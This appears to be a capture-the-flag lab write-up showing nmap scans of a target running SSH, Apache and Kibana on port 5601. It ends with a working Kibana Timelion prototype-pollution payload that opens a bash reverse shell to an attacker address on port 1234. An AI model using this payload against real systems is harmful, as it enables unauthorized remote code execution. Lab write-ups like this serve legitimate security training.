# Enumeration
## NMAP Top 1000
```
# Nmap 7.91 scan initiated Sat Aug 14 21:32:30 2021 as: nmap -sC -sV -vv -oN scans/nmap1000 10.10.184.12
Nmap scan report for 10.10.184.12
Host is up, received syn-ack (0.041s latency).
Scanned at 2021-08-14 21:32:30 UTC for 9s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2fQ/bb8Gwa5L5++T3T5JC7ZvciybYTlcWE9Djbzuco0f86gp3GOzTeVaDuhOWkR6J3fwxxwDWPk6k7NacceG0=
|   256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7PJIcjNmxjQK6/M1zKyptfTrUS2l0ZsELrO3prOA0
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 14 21:32:39 2021 -- 1 IP address (1 host up) scanned in 9.22 seconds

```

## NMAP Full
```
# Nmap 7.91 scan initiated Sat Aug 14 21:35:56 2021 as: nmap -p- -oN scans/nmapFull -vv 10.10.184.12
Nmap scan report for 10.10.184.12
Host is up, received syn-ack (0.038s latency).
Scanned at 2021-08-14 21:35:56 UTC for 15s
Not shown: 65532 closed ports
Reason: 65532 conn-refused
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
80/tcp   open  http     syn-ack
5601/tcp open  esmagent syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Aug 14 21:36:11 2021 -- 1 IP address (1 host up) scanned in 15.01 seconds
```


## Interests

Kibana is running on port 5601, which has been vulnerable to prototype pollution in the past.

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.41.83/1234 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

```
